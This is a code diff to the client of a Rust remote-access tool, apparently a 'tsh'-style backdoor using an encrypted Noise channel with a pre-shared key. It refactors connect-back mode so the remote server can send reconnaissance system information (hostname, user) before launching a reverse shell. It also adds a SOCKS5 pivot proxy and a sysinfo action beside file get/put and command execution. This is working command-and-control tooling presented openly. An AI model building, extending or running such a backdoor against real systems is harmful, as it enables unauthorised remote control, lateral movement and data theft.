@@ -10,7 +10,8 @@ use tokio::fs::File;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
 use crate::{
-    constants::*, error::*, helpers::NoiseLayerExt, noise::NoiseLayer, terminal::TerminalHandler,
+    constants::*, error::*, helpers::NoiseLayerExt, noise::NoiseLayer, sysinfo::SystemInfo,
+    terminal::TerminalHandler,
 };
 
 pub async fn handle_connect_back_mode(port: u16, actions: Vec<&str>, psk: &str) -> TshResult<()> {
@@ -41,38 +42,9 @@ pub async fn handle_connect_back_mode(port: u16, actions: Vec<&str>, psk: &str) 
                 // In connect-back mode, server sends the operation mode
                 info!("🔍 Waiting for server to specify operation mode...");
 
-                // Read operation mode from server
-                let mut mode_buf = [0u8; 1];
-                match layer.read_exact(&mut mode_buf).await {
-                    Ok(_) => {
-                        let mode = OperationMode::try_from(mode_buf[0])
-                            .map_err(TshError::InvalidOperationMode)?;
-                        info!("🎯 Server requested operation: {mode:?}");
-
-                        // Handle the requested operation
-                        let result = match mode {
-                            OperationMode::RunShell => {
-                                info!("🐚 Starting reverse shell as requested by server");
-                                handle_reverse_shell_client(&mut layer).await
-                            }
-                            _ => {
-                                // For other modes, use regular action execution
-                                if actions.is_empty() {
-                                    error!("No action specified for operation mode: {mode:?}");
-                                    Err(TshError::protocol("No action specified"))
-                                } else {
-                                    execute_action(&mut layer, actions.clone()).await
-                                }
-                            }
-                        };
-
-                        if let Err(e) = result {
-                            error!("Operation failed: {e}");
-                        }
-                    }
-                    Err(e) => {
-                        error!("Failed to read operation mode from server: {e}");
-                    }
+                // Read operation modes from server (may receive SysInfo first, then RunShell)
+                if let Err(e) = handle_connect_back_operations(&mut layer, &actions).await {
+                    error!("Operation failed: {e}");
                 }
 
                 break;
@@ -99,6 +71,12 @@ pub async fn handle_direct_connection(
         format!("{target}:{port}")
     };
 
+    // SOCKS5 mode: don't open a single connection, run local proxy instead
+    if actions.first().map(|a| a.starts_with("socks5")) == Some(true) {
+        let bind_addr = parse_socks5_bind(&actions)?;
+        return crate::socks5::run_socks5_client(&bind_addr, &address, psk).await;
+    }
+
     info!("🚀 Connecting to {address}...");
     info!("🔐 PSK authentication enabled");
 
@@ -117,6 +95,17 @@ pub async fn handle_direct_connection(
     execute_action(&mut layer, actions).await
 }
 
+/// Parse socks5 bind address from action: "socks5" or "socks5:127.0.0.1:1080"
+fn parse_socks5_bind(actions: &[&str]) -> TshResult<String> {
+    let action_str = actions.join(" ");
+    let parts: Vec<&str> = action_str.splitn(2, ':').collect();
+    if parts.len() > 1 && !parts[1].is_empty() {
+        Ok(parts[1].to_string())
+    } else {
+        Ok("127.0.0.1:1080".to_string())
+    }
+}
+
 pub(crate) async fn execute_action(layer: &mut NoiseLayer, actions: Vec<&str>) -> TshResult<()> {
     if actions.is_empty() {
         // Interactive shell mode
@@ -127,6 +116,7 @@ pub(crate) async fn execute_action(layer: &mut NoiseLayer, actions: Vec<&str>) -
         let parts: Vec<&str> = action_str.split(':').collect();
 
         match parts.first().copied() {
+            Some("sysinfo") => request_sysinfo(layer).await,
             Some("get") if parts.len() == 3 => download_file(layer, parts[1], parts[2]).await,
             Some("put") if parts.len() == 3 => upload_file(layer, parts[1], parts[2]).await,
             Some("cmd") if parts.len() >= 2 => {
@@ -365,6 +355,71 @@ async fn handle_reverse_shell_client(layer: &mut NoiseLayer) -> TshResult<()> {
     let _ = disable_raw_mode();
 
     result
+}
+
+async fn handle_connect_back_operations(layer: &mut NoiseLayer, actions: &[&str]) -> TshResult<()> {
+    loop {
+        let mut buf = vec![0u8; 8192];
+        let n = layer.read(&mut buf).await?;
+        if n == 0 {
+            return Err(TshError::protocol(
+                "Server disconnected before sending operation mode",
+            ));
+        }
+
+        let mode = OperationMode::try_from(buf[0]).map_err(TshError::InvalidOperationMode)?;
+        info!("🎯 Server requested operation: {mode:?}");
+
+        match mode {
+            OperationMode::SysInfo => {
+                // Parse and display system info from the remaining bytes
+                if n > 1 {
+                    display_sysinfo(&buf[1..n]);
+                }
+                // Continue reading next operation mode
+                continue;
+            }
+            OperationMode::RunShell => {
+                info!("🐚 Starting reverse shell as requested by server");
+                return handle_reverse_shell_client(layer).await;
+            }
+            _ => {
+                if actions.is_empty() {
+                    return Err(TshError::protocol("No action specified"));
+                }
+                return execute_action(layer, actions.to_vec()).await;
+            }
+        }
+    }
+}
+
+async fn request_sysinfo(layer: &mut NoiseLayer) -> TshResult<()> {
+    info!("Requesting system info from server");
+    layer.write_all(&[OperationMode::SysInfo as u8]).await?;
+
+    let mut buf = vec![0u8; 8192];
+    let n = layer.read(&mut buf).await?;
+    if n == 0 {
+        return Err(TshError::protocol("No response from server"));
+    }
+
+    // Server responds with SysInfo mode byte + JSON
+    if buf[0] == OperationMode::SysInfo as u8 && n > 1 {
+        display_sysinfo(&buf[1..n]);
+    } else {
+        display_sysinfo(&buf[..n]);
+    }
+
+    Ok(())
+}
+
+fn display_sysinfo(json_bytes: &[u8]) {
+    match SystemInfo::from_json_bytes(json_bytes) {
+        // Intentional: displaying agent system info (hostname, user, etc.) to the
+        // operator is the core purpose of this reconnaissance feature.
+        Some(info) => print!("{}", info.display()), // lgtm[rust/log-sensitive-data]
+        None => error!("Failed to parse system info"),
+    }
 }
 
 async fn execute_command(layer: &mut NoiseLayer, command: &str) -> TshResult<()> {
